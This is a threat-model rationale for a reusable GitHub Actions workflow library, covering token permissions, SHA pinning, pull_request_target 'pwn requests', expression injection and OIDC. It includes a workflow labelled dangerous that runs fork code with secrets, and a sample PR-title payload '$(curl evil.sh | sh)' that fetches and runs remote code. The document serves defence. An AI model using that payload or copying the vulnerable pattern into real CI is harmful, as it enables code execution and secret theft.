# Security posture — rationale and attack anatomy

Background for the rules in [SKILL.md](SKILL.md). Section numbers mirror the skill. This is the threat model the
`bitwise-media-group/github-workflows` library is written against — a reusable workflow author cannot see or constrain
how a consumer wires the caller's trigger, so every workflow must be safe regardless of calling context.

## 1. Why default-deny, granted per job

The `GITHUB_TOKEN` is minted per run with whatever the `permissions:` block allows. Omitting the block falls back to the
repository/organization default, which is often the legacy read/write on `contents` and more. `permissions: {}` at the
top makes the default deny-all, and a per-job grant means a step compromised in the `build` job holds only
`contents: read` — it cannot push tags, publish packages, or open PRs. Granting at the workflow top level instead leaks
the broadest job's scopes to every job.

## 2. Why SHA pins, not tags

`uses: foo/bar@v1` resolves a tag at run time. Tags are mutable refs: a compromise (or a malicious maintainer) can move
`v1` to a commit that reads your secrets. A 40-character commit SHA is content- addressed and immutable, so a moved tag
cannot change what runs. The trade-off — stale pins — is handled by Dependabot's `github-actions` ecosystem, which opens
a PR when a new version ships; the version comment (`# v6.0.3`) keeps the pin human-readable. This applies to
first-party `actions/*` too: trust is anchored in the SHA, not the org name.

## 3. The pwn request, and why the allowlist fails closed

`pull_request` from a fork runs with a read-only token and no secrets, so even fully attacker- controlled code can't do
harm. `pull_request_target` fires the workflow defined on the **base** branch but in a privileged context — repository
secrets present, token writable. The danger is the combination "privileged context" + "checks out and runs PR head
code":

```yaml
# DANGEROUS — do not do this
on:
    pull_request_target:
jobs:
    build:
        steps:
            - uses: actions/checkout@<sha>
              with:
                  ref: ${{ github.event.pull_request.head.sha }} # untrusted fork code...
            - run: make build # ...now running with secrets + a write token
```

A fork author edits the build to print `${{ secrets.* }}` or curl them out. Safe uses of `pull_request_target` run
**no** PR code at all — they only call the API with a narrow token (post a comment, set a label).

Reusable workflows add a second defense. GitHub gives a reusable workflow no way to declare which events may call it, so
a consumer could wire a privileged release job behind a fork-controllable trigger. The library gates such jobs on a
positive allowlist of trusted events and skips everything else — including any new event type GitHub adds later:

```yaml
jobs:
    publish:
        if: ${{ contains(fromJSON('["push","workflow_dispatch","schedule"]'), github.event_name) }}
```

An allowlist fails closed (unknown event → skip); a denylist of "bad" events fails open the moment a new event appears.

## 4. Why expression injection works

`${{ ... }}` is substituted into the `run:` script as text **before** the shell parses it. A pull request titled
`$(curl evil.sh | sh)` becomes that literal command. Environment variables are different: the runner sets `PR_TITLE` to
the value and the shell only ever sees `$PR_TITLE`, so the data is never re-parsed as code. Quote the expansion
(`"$PR_TITLE"`) to avoid word-splitting. The same rule covers branch names, commit messages, author names, and
review/issue bodies — anything a non-maintainer can set.

## 5. OIDC over stored keys

A long-lived cloud key stored as a secret is a standing liability: it works from anywhere until someone rotates it. With
OIDC, the job requests a short-lived token (`permissions: id-token: write`) that the cloud exchanges for credentials
scoped to that repo and ref, expiring in minutes. Nothing durable is stored, and access is bound to the workflow
identity. Pass secrets that you do keep explicitly through `secrets:` so a reusable workflow receives only what it
needs, not the whole repo via `secrets: inherit`.

## 7. Defense in depth

These rules are belt-and-braces: `actions-validate` (actionlint + zizmor) catches unpinned actions, injectable
expressions, and dangerous `pull_request_target` checkouts locally before commit, and CodeQL's `actions` analysis
re-checks them in CI. Neither replaces reading the workflow — but a finding from either is a real issue to fix, not a
style nit.
